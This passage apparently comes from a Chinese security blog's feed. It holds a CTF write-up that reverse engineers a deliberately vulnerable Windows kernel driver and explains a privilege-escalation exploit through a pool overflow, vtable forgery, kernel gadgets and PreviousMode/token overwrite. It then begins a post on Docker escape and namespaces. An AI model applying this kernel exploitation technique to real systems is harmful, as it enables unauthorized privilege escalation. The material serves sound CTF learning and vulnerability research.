&#123;</span><br><span class="line">      ULONG NumberOfPresentedRequests;</span><br><span class="line">    &#125; Parallel;</span><br><span class="line">  &#125; Settings;</span><br><span class="line">  WDFDRIVER                                   Driver;</span><br><span class="line">&#125; WDF_IO_QUEUE_CONFIG, *PWDF_IO_QUEUE_CONFIG;</span><br></pre></td></tr></table></figure>

<h3 id="Ring3-与-Ring0"><a href="#Ring3-与-Ring0" class="headerlink" title="Ring3 与 Ring0"></a>Ring3 与 Ring0</h3><p>通信依然使用 <code>DeviceIoControl</code>，但是需要使用 <code>GUID</code> 获得驱动的名字</p>
<p>ring0获得ring3 buffer：inbuffer和outbuffer</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">WdfRequestRetrieveInputBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            WDFREQUEST Request,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="type">size_t</span>     MinimumRequiredLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]           PVOID      *Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] <span class="type">size_t</span>     *Length</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">WdfRequestRetrieveOutputBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            WDFREQUEST Request,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            <span class="type">size_t</span>     MinimumRequiredSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]           PVOID      *Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] <span class="type">size_t</span>     *Length</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>


<p>ring3通过guid与ring0通信</p>
<ul>
<li>存在symlink与WDM没有区别</li>
</ul>
<p>WDF逆向：<a href="https://ioactive.com/wp-content/uploads/2018/09/Reverse_Engineering_and_Bug_Hunting_On_KMDF_Drivers.pdf">Reverse_Engineering_and_Bug_Hunting_On_KMDF_Drivers</a></p>
<p>通信，来自代码仓 - <a href="https://github.com/hustd10/Windows-Driver">hustd10&#x2F;Windows-Driver</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">DEFINE_GUID</span>(WDF_GUID, xxxx, xx, xx, x,x,x,x,x,x,x,x);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetInterfaceDevicePath</span><span class="params">(GUID* guid)</span> </span>&#123;</span><br><span class="line">	DWORD requiredSize;</span><br><span class="line">	<span class="type">int</span> MemberIdx = <span class="number">0</span>;</span><br><span class="line">	HDEVINFO hDeviceInfoset = <span class="built_in">SetupDiGetClassDevs</span>(guid, <span class="literal">NULL</span>, <span class="number">0</span>, DIGCF_DEVICEINTERFACE | DIGCF_PRESENT);</span><br><span class="line">	<span class="keyword">if</span> (hDeviceInfoset != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		SP_DEVICE_INTERFACE_DATA  DeviceInterfaceData = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">		DeviceInterfaceData.cbSize = <span class="built_in">sizeof</span>(SP_DEVICE_INTERFACE_DATA);</span><br><span class="line">		<span class="keyword">while</span> (<span class="built_in">SetupDiEnumDeviceInterfaces</span>(hDeviceInfoset, <span class="literal">NULL</span>, guid, MemberIdx, &amp;DeviceInterfaceData)) &#123;</span><br><span class="line">			MemberIdx++;</span><br><span class="line">			SP_DEVINFO_DATA DeviceInfoData = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">			DeviceInfoData.cbSize = <span class="built_in">sizeof</span>(SP_DEVINFO_DATA);</span><br><span class="line">			<span class="built_in">SetupDiGetDeviceInterfaceDetail</span>(hDeviceInfoset, &amp;DeviceInterfaceData, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;requiredSize, <span class="literal">NULL</span>);</span><br><span class="line">			SP_DEVICE_INTERFACE_DETAIL_DATA* DevIntfDetailData = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY,</span><br><span class="line">				requiredSize);</span><br><span class="line">			DevIntfDetailData-&gt;cbSize = <span class="built_in">sizeof</span>(SP_DEVICE_INTERFACE_DETAIL_DATA);</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">SetupDiGetDeviceInterfaceDetail</span>(hDeviceInfoset, &amp;DeviceInterfaceData,</span><br><span class="line">				DevIntfDetailData, requiredSize, &amp;requiredSize, &amp;DeviceInfoData)) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;DevicePath: %S\n&quot;</span>, (TCHAR*)DevIntfDetailData-&gt;DevicePath);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">HeapFree</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, DevIntfDetailData);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">SetupDiDestroyDeviceInfoList</span>(hDeviceInfoset);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>工具</p>
<ul>
<li>WinObjEx</li>
<li>deviceTree</li>
</ul>
<h3 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h3><p>刚开始是和WDM一样，OSRLoader加载，但是后面找不到设备。因此快速入门了一下开发，发现可以使用WDK里面的工具安装</p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/writing-a-very-small-kmdf--driver#build-the-driver">编写 Hello World Windows 驱动程序 (KMDF)</a></li>
</ul>
<p>需要根据<code>inf</code>文件的内容，使用如下的格式进行安装（直接安装到<code>C:\System32\drivers</code>，开机自启）</p>
<figure class="highlight pwsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root\xxx 需要根据inf文件获得</span></span><br><span class="line">devcon.exe install xxx.inf root\xxx</span><br></pre></td></tr></table></figure>

<p>WDM也可以根据命令行进行加载 <code>sc.exe</code></p>
<ul>
<li><a href="https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/sc-create">sc.exe create | Microsoft Learn</a></li>
</ul>
<figure class="highlight pwsh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> &lt;server&gt; [<span class="type">command</span>] [<span class="type">service</span> <span class="type">name</span>] &lt;option1&gt; &lt;option2&gt;</span><br></pre></td></tr></table></figure>

<h2 id="驱动逆向"><a href="#驱动逆向" class="headerlink" title="驱动逆向"></a>驱动逆向</h2><p>有符号表，比较友好</p>
<p>获得对应的目录，将pdb放入，就可以带符号调试</p>
<figure class="highlight pwsh"><table><tr><td class="code"><pre><span class="line">!sym noisy</span><br></pre></td></tr></table></figure>

<p>ceateMyLogFile</p>
<ul>
<li><code>InBuf</code> 指定 filename</li>
<li><code>logfilemem</code>  BIGPOOL 转化为<code>struct myLOG_HEADER</code></li>
<li><code>logfilemem-&gt;logname</code> POOL</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">myLOG_HEADER</span>   <span class="comment">// size 0x228</span></span><br><span class="line">&#123;</span><br><span class="line">  myCLFS_METADATA_RECORD_HEADER hdrBaseRecord;</span><br><span class="line">  <span class="type">unsigned</span> __int64 logID;</span><br><span class="line">  <span class="type">wchar_t</span> *logName;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Containers;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cbBusyContainers;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> rgContainers[<span class="number">128</span>];</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cbSymbolZone;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cbSector;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">myCLFS_METADATA_RECORD_HEADER</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> magic;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>add container</p>
<ul>
<li>传递参数 <code>addLogContainer_parm</code>，根据name创建一个 myContainer</li>
<li>cbSymbolZone 偏移，结构体的下一个起始位置</li>
<li>rgContainers 在POOL中的起始位置</li>
<li>Containers 记录个数</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span>  <span class="title class_">addLogContainer_parm</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *logFile;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> nameLen;</span><br><span class="line">  <span class="type">wchar_t</span> containerName[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__cppobj</span> myContainer : baseContainer</span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">__cppobj</span> baseContainer</span><br><span class="line">&#123;</span><br><span class="line">  baseContainer_vtbl *__vftable <span class="comment">/*VFT*/</span>;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">  <span class="type">const</span> <span class="type">wchar_t</span> *fileName;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="comment">/*VFT*/</span> baseContainer_vtbl</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">void</span> (__fastcall *write_data)(baseContainer *<span class="keyword">this</span>, <span class="type">char</span> *);</span><br><span class="line">  <span class="built_in">void</span> (__fastcall *removeContainer)(baseContainer *<span class="keyword">this</span>);</span><br><span class="line">  <span class="built_in">void</span> (__fastcall *releaseContainer)(baseContainer *<span class="keyword">this</span>);</span><br><span class="line">  <span class="built_in">void</span> (__fastcall *read_data)(baseContainer *<span class="keyword">this</span>, <span class="type">char</span> *);</span><br><span class="line">  <span class="built_in">int</span> (__fastcall *read_meta_data)(baseContainer *<span class="keyword">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vtable</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">myContainer::write_data</span><span class="params">(myContainer *<span class="keyword">this</span>, <span class="type">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">strncpy_0</span>(<span class="keyword">this</span>-&gt;data, data, <span class="number">0x200</span>ui64);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">myContainer::read_data</span><span class="params">(myContainer *<span class="keyword">this</span>, <span class="type">char</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">strncpy_0</span>(data, <span class="keyword">this</span>-&gt;data, <span class="number">0x200</span>ui64);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// data</span></span><br><span class="line"><span class="keyword">this</span>-&gt;data = (<span class="type">char</span> *)<span class="built_in">ExAllocatePool2</span>(<span class="number">64</span>i64, <span class="number">0x7228</span>i64, <span class="string">&#x27;gl3d&#x27;</span>);<span class="comment">// </span></span><br><span class="line"><span class="comment">// #define POOL_FLAG_NON_PAGED               0x0000000000000040UI64     // Non paged pool NX</span></span><br></pre></td></tr></table></figure>

<p>记录下一个块的偏移</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( logFile-&gt;Containers )</span><br><span class="line">&#123;</span><br><span class="line">	thisContainer-&gt;cbPrevOffset = logFile-&gt;rgContainers[logFile-&gt;Containers - <span class="number">1</span>];</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)&amp;logFile-&gt;rgContainers[<span class="number">47</span>] + logFile-&gt;rgContainers[logFile-&gt;Containers - <span class="number">1</span>]) = logFile-&gt;rgContainers[logFile-&gt;Containers];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>read&#x2F;writeLogRecord</p>
<ul>
<li>container函数调用</li>
</ul>
<p>这个context</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">__declspec</span>(<span class="built_in">align</span>(<span class="number">8</span>)) LogRecord_parm</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *logFile;</span><br><span class="line">  <span class="type">int</span> ContainerID;</span><br><span class="line">  <span class="type">char</span> data[<span class="number">512</span>];        <span class="comment">// ExAllocatePool 0x200</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// size 0xe0</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">my_CLFS_CONTAINER_CONTEXT</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 cidContainer;</span><br><span class="line">  <span class="type">wchar_t</span> containerName[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">	&#123;</span><br><span class="line">	  myContainer *pContainer;               <span class="comment">// new myContainer, size 0x18</span></span><br><span class="line">	  <span class="type">unsigned</span> __int64 ullAlignment;</span><br><span class="line">	&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cbPrevOffset;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cbNextOffset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>remove container</p>
<ul>
<li>修改了 <code>cbNextOffset</code>，修改偏移 <code>cbSymbolZone</code></li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">__declspec</span>(<span class="built_in">align</span>(<span class="number">8</span>)) removeLogContainer_parm</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *logFile;</span><br><span class="line">  <span class="type">int</span> ContainerID;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">removeLogContainer</span><span class="params">(myLOG_HEADER *logFile, <span class="type">signed</span> <span class="type">int</span> ContainerID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  my_CLFS_CONTAINER_CONTEXT *thisContainer; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  myContainer *pContainer; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ContainerID &lt; <span class="number">0</span> || ContainerID &gt; logFile-&gt;Containers )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>i64;</span><br><span class="line">  thisContainer = (my_CLFS_CONTAINER_CONTEXT *)((<span class="type">char</span> *)logFile + logFile-&gt;rgContainers[ContainerID]);</span><br><span class="line">  pContainer = thisContainer-&gt;pContainer;</span><br><span class="line">  <span class="keyword">if</span> ( pContainer )</span><br><span class="line">    myContainer::`scalar deleting destructor<span class="number">&#x27;</span>(pContainer, <span class="number">1</span>);</span><br><span class="line">  *(<span class="type">unsigned</span> <span class="type">int</span> *)((<span class="type">char</span> *)&amp;logFile-&gt;rgContainers[<span class="number">46</span>] + thisContainer-&gt;cbNextOffset) = thisContainer-&gt;cbPrevOffset;</span><br><span class="line">  logFile-&gt;cbSymbolZone -= <span class="number">0xE0</span>;</span><br><span class="line">  --logFile-&gt;Containers;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>closeLogFile：清空所有的container以及logfileMem</p>
<p>其大致内存结构，在一个BIGPOOL中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">myLOG_HEADER           大小<span class="number">0x228</span></span><br><span class="line">	cbSymbolZone 表示可用内存的起始地址</span><br><span class="line"></span><br><span class="line">注册一个container 最多可以注册<span class="number">128</span>个 my_CLFS_CONTAINER_CONTEXT <span class="number">0xe0</span></span><br><span class="line">	pContainer <span class="number">0x18</span> myContainer 结构体</span><br><span class="line">	cbPrevOffset 记录前一个 container 起始地址偏移</span><br><span class="line">	cbNextOffset 记录后一个起始地址偏移</span><br></pre></td></tr></table></figure>


<p>这个<code>wstrcpy</code>溢出写，containerName 我们传入，长度随意，<code>thisContainer-&gt;containerName</code> 只有100的长度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">wstrcpy</span>(thisContainer-&gt;containerName, containerName, len);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数也存在一个溢出 读/写 wchar</span></span><br><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">wstrcpy</span><span class="params">(<span class="type">wchar_t</span> *dst, <span class="type">wchar_t</span> *src, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len + <span class="number">1</span>; ++i )</span><br><span class="line">    dst[i] = src[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">my_CLFS_CONTAINER_CONTEXT</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 cidContainer;</span><br><span class="line">  <span class="type">wchar_t</span> containerName[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">union</span></span><br><span class="line">	&#123;</span><br><span class="line">	  myContainer *pContainer;               <span class="comment">// new myContainer, size 0x18</span></span><br><span class="line">	  <span class="type">unsigned</span> __int64 ullAlignment;</span><br><span class="line">	&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cbPrevOffset;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cbNextOffset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>没有限制的溢出，我们查一下池的基地址，将container地址改成池中的地址，然后覆盖container地址，伪造一个container</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">logfileMem = (myLOG_HEADER *)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPool, <span class="number">0x7228</span>ui64, <span class="number">0x4C674673</span>u);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一个大池，TAG不同</span></span><br><span class="line"><span class="keyword">this</span>-&gt;data = (<span class="type">char</span> *)<span class="built_in">ExAllocatePool2</span>(<span class="number">64</span>i64, <span class="number">0x7228</span>i64, <span class="string">&#x27;gl3d&#x27;</span>);</span><br></pre></td></tr></table></figure>


<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>我首先尝试了使用给出的任意读写原语。</p>
<ul>
<li>多次蓝屏后意识到这根本不是 <code>strcpy</code>，而是 <code>memcpy</code> ，没有<code>\x00</code>截断</li>
<li>因此尝试读写token有点问题，长度0x200的memcpy，写入0x200 token直接蓝屏，并且接收不到内容</li>
</ul>
<p>NonPagedPool是可执行的，但是因为shellcode里存在 <code>0x0000</code> 无法直接写入全部shellcode，可以尝试ROP</p>
<p>使用了HEVD：<code>mov esp gadget</code>，直接失败了，显示访问非法内存。</p>
<p>CLFS ROP CVE 存在相关,不错的gadget: <code>RtlClearBit</code> 和 <code>SeSetAccessStateGenericMapping</code></p>
<ul>
<li><a href="https://www.coresecurity.com/core-labs/articles/analysis-cve-2023-28252-clfs-vulnerability">Analysis of CVE-2023-28252 CLFS Vulnerability</a></li>
<li><a href="https://www.zscaler.com/blogs/security-research/technical-analysis-windows-clfs-zero-day-vulnerability-cve-2022-37969-part2-exploit-analysis">CVE-2022-37969 | Windows CLFS Zero-Day</a></li>
<li><a href="https://mas0n.org/94f74a6b0a844648b46728a89c5cbb03#d8a5fc8f50974a07b90186c2cc43115d">CVE-2022-37969</a></li>
<li><a href="https://blog.qwerdf.com/2022/11/30/CVE-2022-37969/#%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF%E5%8F%82%E8%80%83">CVE-2022-37969</a></li>
</ul>
<p>SeSetAccessStateGenericMapping  修改 <code>_ETHREAD._KTHREAD.PreviousMode</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; u SeSetAccessStateGenericMapping</span><br><span class="line">nt!SeSetAccessStateGenericMapping:</span><br><span class="line">fffff800`<span class="number">06e712</span>b0 <span class="number">488b</span>4148        mov     rax,qword ptr [rcx+<span class="number">48</span>h]</span><br><span class="line">fffff800`<span class="number">06e712</span>b4 <span class="number">0f</span>1002          movups  xmm0,xmmword ptr [rdx]</span><br><span class="line">fffff800`<span class="number">06e712</span>b7 f30f7f4008      movdqu  xmmword ptr [rax+<span class="number">8</span>],xmm0</span><br><span class="line">fffff800`<span class="number">06e712</span>bc c3              ret</span><br></pre></td></tr></table></figure>

<p>此处rcx是pContainer，已知</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">thisContainer-&gt;pContainer-&gt;<span class="built_in">read_data</span>(thisContainer-&gt;pContainer, data);</span><br></pre></td></tr></table></figure>

<p><code>[rdx]</code>可以是0（用户buffer），<code>rax+8</code> 设置为<code>_ETHREAD._KTHREAD.PreviousMode</code>地址。</p>
<p>SeSetAccessStateGenericMapping偏移我实在windbg直接找，不够自动化，看CVE时发现可以使用找函数的方法来直接获得😋</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://github.com/fortra/CVE-2022-37969/blob/main/CVE-2022-37969-PoC.cpp</span></span><br><span class="line">HMODULE ntos_userBase = <span class="built_in">LoadLibraryExW</span>(<span class="string">L&quot;ntoskrnl.exe&quot;</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (ntos_userBase)</span><br><span class="line">&#123;</span><br><span class="line">	v22a = <span class="built_in">GetProcAddress</span>(ntos_userBase, <span class="string">&quot;SeSetAccessStateGenericMapping&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">offset_SeSetAccess = (UINT64)v22a - (UINT64)ntos_userBase;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Offset SeSetAccessStateGenericMapping ----------&gt; %p\n&quot;</span>, offset_SeSetAccess);</span><br><span class="line">fnSeSetAccessStateGenericMapping = ntos_kernelBase + offset_SeSetAccess;</span><br></pre></td></tr></table></figure>

<p>因此最后修改 <code>PreviousMode</code> 为0，任意地址读写，修改token，提权成功。</p>
<p>代码仓库 - <a href="https://github.com/Ha0-Y/WP">CTF WP</a></p>
<p>使用 <code>RtlClearBit</code> 也可以构造出同样的效果 - 是将 <code>[rcx+8]</code> 地址加上 <code>edx</code> 偏移置为0，但是这个edx还是得控制一下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; u nt!RtlClearBit</span><br><span class="line">nt!RtlClearBit:</span><br><span class="line">fffff802`<span class="number">1615</span>c150 <span class="number">488b</span>4108        mov     rax,qword ptr [rcx+<span class="number">8</span>]</span><br><span class="line">fffff802`<span class="number">1615</span>c154 <span class="number">0f</span>b310          btr     dword ptr [rax], edx</span><br><span class="line">fffff802`<span class="number">1615</span>c157 c3              ret</span><br></pre></td></tr></table></figure>

<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>WinDbg命令行</p>
<figure class="highlight pwsh"><table><tr><td class="code"><pre><span class="line">windbg.exe <span class="literal">-k</span> <span class="literal">-d</span> net:port=&lt;YourDebugPort&gt;,key=&lt;YourKey&gt;</span><br></pre></td></tr></table></figure>

<p>需要注意 <code>ZwCreateFile</code> 访问文件 <code>C:\\Users:\\Public\\tmp.log</code> 需要是 <code>\\??\\C:\\Users\\Public\\tmp.log</code> 才能正确识别</p>
<ul>
<li>内核和用户看到的不是同一个东西</li>
<li><a href="https://www.cnblogs.com/geons/p/8685175.html">Windows内核驱动中操作文件</a></li>
</ul>
<p>传入数据时，因为wstrcpy本身存在问题，因此可能访问不能访问的页</p>
<p>比如数据填满，就会访问后面的数据。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">AAAAAAAAAA &lt;- 访问到这里时，溢出页大概率崩溃</span><br><span class="line">PAGE</span><br></pre></td></tr></table></figure>

<p>因此我们传递参数时，buffer后面需要加一个padding <code>\x00\x00</code> 避免访问未知内存而蓝屏（因为这个改了几小时的BUG😭</p>
<p>感觉还不错，赶在结束前做出来了，有点遗憾的是做完这个之后没精力看qemu逃逸那个题目了。</p>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker-escape</title>
    <url>/2024/03/06/Docker-escape/</url>
    <content><![CDATA[<blockquote>
<p>云😶‍🌫️</p>
</blockquote>
<span id="more"></span>

<p>OCI（Open Container Initiative）规范是事实上的容器标准，已经被大部分容器实现以及容器编排系统所采用，包括 Docker 和 Kubernetes。</p>
<p>从 OCI 规范开始了解容器镜像，可以让我们对容器技术建立更全面清晰的认知，而不是囿于实现细节。OCI 规范分为 <code>Image spec</code> 和 <code>Runtime spec</code> 两部分，它们分别覆盖了容器生命周期的不同阶段</p>
<h2 id="Docker核心原理"><a href="#Docker核心原理" class="headerlink" title="Docker核心原理"></a>Docker核心原理</h2><p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html">Go 语言</a> 并遵从 Apache2.0 协议开源。</p>
<p>Docker的实现依赖于Linux中众多的基础机制，包括用于资源限制的cgroup，用于隔离的Namespace，以及用于实现docker文件系统的Union FS等。</p>
<h3 id="namespace"><a href="#namespace" class="headerlink" title="namespace"></a>namespace</h3><p>资源隔离</p>
<p>Linux的 namespace 可以实现资源能够在不同的命名空间里有相同的名称，譬如在 <code>A命名空间</code> 有个pid为1的进程，而在 <code>B命名空间</code> 中也可以有一个pid为1的进程。</p>
<p><a href="https://elixir.bootlin.com/linux/latest/source/include/linux/nsproxy.h#L31">nsproxy.h</a>，7种namespace，对于每个任务 <code>task_struct</code> 都存在一个nsproxy 成员</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A structure to contain pointers to all per-process</span></span><br><span class="line"><span class="comment"> * namespaces - fs (mount), uts, network, sysvipc, etc.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The pid namespace is an exception -- it&#x27;s accessed using</span></span><br><span class="line"><span class="comment"> * task_active_pid_ns.  The pid namespace here is the</span></span><br><span class="line"><span class="comment"> * namespace that children will use.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &#x27;count&#x27; is the number of tasks holding a reference.</span></span><br><span class="line"><span class="comment"> * The count for each namespace, then, will be the number</span></span><br><span class="line"><span class="comment"> * of nsproxies pointing to it, not the number of tasks.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The nsproxy is shared by tasks which share all namespaces.</span></span><br><span class="line"><span class="comment"> * As soon as a single namespace is cloned or unshared, the</span></span><br><span class="line"><span class="comment"> * nsproxy is copied.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">nsproxy</span> &#123;</span><br><span class="line">	<span class="type">refcount_t</span> count;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">uts_namespace</span> *uts_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">ipc_namespace</span> *ipc_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">mnt_namespace</span> *mnt_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">pid_namespace</span> *pid_ns_for_children;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">net</span> 	     *net_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">time_namespace</span> *time_ns;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">time_namespace</span> *time_ns_for_children;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">cgroup_namespace</span> *cgroup_ns;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>namespace也是linux内核的一个特性，它将内核资源分隔开，一组进程能看到一些资源，而其他组的进程看到的是不同的资源，组与组之间互不干扰，不知道对方的存在。简单来说，namespace就是内核提供的一种进程间资源隔离技术。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ <span class="built_in">ls</span> -al /proc/self/ns</span><br><span class="line">total 0</span><br><span class="line">dr-x--x--x 2 ubuntu ubuntu 0 Mar  6 09:28 .</span><br><span class="line">dr-xr-xr-x 9 ubuntu ubuntu 0 Mar  6 09:28 ..</span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 cgroup -&gt; <span class="string">&#x27;cgroup:[4026531835]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 ipc -&gt; <span class="string">&#x27;ipc:[4026531839]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 mnt -&gt; <span class="string">&#x27;mnt:[4026531841]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 net -&gt; <span class="string">&#x27;net:[4026531840]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 0 Mar  6 09:28 pid -&gt; <span class="string">&#x27;pid:[4026531836]&#x27;</span></span><br><span class="line">lrwxrwxrwx 1 ubuntu ubuntu 